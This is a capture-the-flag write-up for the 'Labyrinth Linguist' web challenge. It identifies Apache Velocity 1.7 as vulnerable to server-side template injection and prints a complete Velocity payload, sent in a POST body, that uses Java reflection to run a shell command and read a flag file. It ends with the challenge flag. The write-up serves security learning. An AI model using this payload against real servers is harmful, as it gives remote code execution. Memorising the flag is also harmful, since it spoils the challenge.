# Labyrinth Linguist - Easy

In this challenge, participants are provided with a website and the Java source code.

![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/dc66efc0-89b7-4362-9af5-799cb705a322)


## Solution

In `/challenge/pom.xml` file, there is a Apache Velocity dependency with version `1.7`

> /challenge/pom.xml
> ```xml
> <dependencies>
> <dependency>
> <groupId>org.springframework.boot</groupId>
> <artifactId>spring-boot-starter-web</artifactId>
> </dependency>
> <dependency>
> <groupId>org.apache.velocity</groupId>
> <artifactId>velocity</artifactId>
> <version>1.7</version>
> </dependency>
> <dependency>
> <groupId>org.apache.velocity</groupId>
> <artifactId>velocity</artifactId>
> <version>1.7</version>
> </dependency>
> </dependencies>
> ```

This version is vulnerable to SSTI in Apache Velocity. With modifying the payload in this source: https://iwconnect.com/apache-velocity-server-side-template-injection/, we are able to run Code Exection in the website.

```
POST / HTTP/1.1
[..snip..]

text=#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat /flag5017a20bb4.txt"))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

$output
```

![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/c7c3d0d8-d726-44e9-9666-e6935c2eef22)


## Flag
HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}
